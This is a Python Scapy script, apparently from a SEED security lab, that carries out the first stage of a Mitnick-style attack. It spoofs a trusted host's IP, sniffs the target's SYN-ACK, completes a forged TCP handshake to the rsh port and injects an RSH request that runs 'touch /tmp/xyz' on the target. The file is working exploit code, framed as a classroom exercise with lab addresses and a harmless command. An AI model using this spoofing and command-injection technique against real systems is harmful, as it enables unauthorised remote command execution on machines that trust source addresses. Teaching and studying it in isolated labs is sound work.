#!/usr/bin/env python3
"""First forged RSH connection, fixed harmless command for SEED only.
Start rsh_second.py in another terminal BEFORE this program.
Run: sudo docker exec -it seed-attacker python3 /volumes/rsh_first.py
"""
import os
from threading import Thread
from time import sleep
from scapy.all import IP, TCP, Raw, send, sniff

TRUSTED_IP = "10.9.0.6"
TARGET_IP = "10.9.0.5"
IFACE = os.environ.get("LAB_IFACE", "br-6514365f0955")
SOURCE_PORT = 1023
RSH_PORT = 514
CLIENT_ISN = 0x1000
CALLBACK_PORT = 9090
# Four NUL-separated fields: callback port, client user, server user, command.
RSH_REQUEST = b"9090\x00seed\x00seed\x00touch /tmp/xyz\x00"
handled = False


def on_packet(packet):
    global handled
    if handled or not packet.haslayer(TCP):
        return
    if packet[TCP].flags != "SA":
        return
    handled = True
    server_isn = packet[TCP].seq
    seq = (CLIENT_ISN + 1) % (2**32)
    ack = (server_isn + 1) % (2**32)
    print(f"[+] Server ISN: {server_isn}", flush=True)
    ip = IP(src=TRUSTED_IP, dst=TARGET_IP)

    # Third packet of TCP's three-way handshake.
    final_ack = ip / TCP(sport=SOURCE_PORT, dport=RSH_PORT,
                         flags="A", seq=seq, ack=ack)
    send(final_ack, verbose=False)
    print("[+] Final ACK sent", flush=True)

    # Application bytes are sent after the handshake.
    request = (
        ip / TCP(sport=SOURCE_PORT, dport=RSH_PORT,
                 flags="PA", seq=seq, ack=ack)
        / Raw(load=RSH_REQUEST)
    )
    send(request, verbose=False)
    print(f"[+] RSH request sent ({len(RSH_REQUEST)} bytes)", flush=True)
    print(f"[*] Look for a callback SYN to port {CALLBACK_PORT}", flush=True)


def send_initial_syn():
    sleep(1)
    syn = (
        IP(src=TRUSTED_IP, dst=TARGET_IP)
        / TCP(sport=SOURCE_PORT, dport=RSH_PORT,
              flags="S", seq=CLIENT_ISN)
    )
    print("[*] Sending lab SYN", flush=True)
    send(syn, count=1, verbose=False)


if __name__ == "__main__":
    Thread(target=send_initial_syn, daemon=True).start()
    sniff(
        iface=IFACE,
        filter=(f"tcp and src host {TARGET_IP} and dst host {TRUSTED_IP} "
                f"and src port {RSH_PORT} and dst port {SOURCE_PORT}"),
        prn=on_packet,
        stop_filter=lambda _packet: handled,
        timeout=15,
        store=False,
    )
    print("[*] First-connection test finished", flush=True)
